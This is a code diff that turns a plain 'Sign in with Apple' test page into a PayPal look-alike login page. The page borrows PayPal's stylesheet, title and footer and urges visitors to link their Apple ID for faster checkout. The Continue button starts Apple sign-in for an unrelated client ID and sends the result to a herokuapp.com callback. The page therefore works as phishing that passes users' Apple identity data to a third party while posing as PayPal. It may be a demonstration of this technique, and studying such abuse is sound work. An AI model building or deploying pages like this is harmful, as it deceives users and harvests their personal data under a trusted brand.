@@ -1,11 +1,56 @@
+<!DOCTYPE html>
 <html>
-    <head>
-    </head>
-    <body>
-        <button id="sign-in-with-apple-button"> Sign In with Apple </button>
-        <script type="text/javascript" src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"></script>
-        <script type="text/javascript">
-            AppleID.auth.init({
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <title>Log in to your PayPal account</title>
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
+    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/bc4/702f40f2e7398ff368b30099ca19e/css/contextualLogin.css" />
+
+</head>
+
+<body class="desktop">
+    <div id="main" class="main" role="main">
+        <section id="slLanding" class="slLanding  " data-role="page" data-title="Log in to your PayPal account">
+            <div class="corral">
+                <div id="content" class="contentContainer activeContent">
+                    <header>
+                        <p class="paypal-logo paypal-logo-long"></p>
+                    </header>
+                    <div id="linked" class="linked">
+                        <div id="headerIcon" class="partnerConnect"></div>
+                        <div class="headerTextDecorated"></div>
+                        <h1 class="headerText">Stay logged in for faster checkout</h1>
+                        <p class="description assure">Link your Apple Id with your PayPal account and Enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices.)<span class="learnMoreLink"><a href="#" id="slLoginLearnMore" class="secondayLink" pa-marked="1">What's this?</a></span></p>
+                        <br/> <br/>
+                        <div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-continue" id="sign-in-with-apple-button" name="continueBtn" value="continueBtn" pa-marked="1">Continue with Apple</button></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <footer class="footer" role="contentinfo">
+            <div class="legalFooter">
+                <ul class="footerGroup">
+                    <li>
+                        <a target="_blank" href="/us/cgi-bin/webscr?cmd=_help">Contact Us</a>
+                    </li>
+                    <li>
+                        <a target="_blank" href="/us/webapps/mpp/ua/privacy-full">Privacy</a>
+                    </li>
+                    <li>
+                        <a target="_blank" href="/us/webapps/mpp/ua/legalhub-full">Legal</a>
+                    </li>
+                    <li>
+                        <a target="_blank" href="/us/webapps/mpp/country-worldwide">Worldwide</a>
+                    </li>
+                </ul>
+            </div>
+        </footer>
+    </div>
+    <script type="text/javascript" src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"></script>
+    <script type="text/javascript">
+        AppleID.auth.init({
                 clientId : 'jp.yauth.signin.service3',
                 scope : 'email name',
                 redirectURI: 'https://signin-with-apple.herokuapp.com/callback',
@@ -16,6 +61,7 @@
             buttonElement.addEventListener('click', () => {
                 AppleID.auth.signIn();
             });
-        </script>
-    </body>
+    </script>
+</body>
+
 </html>
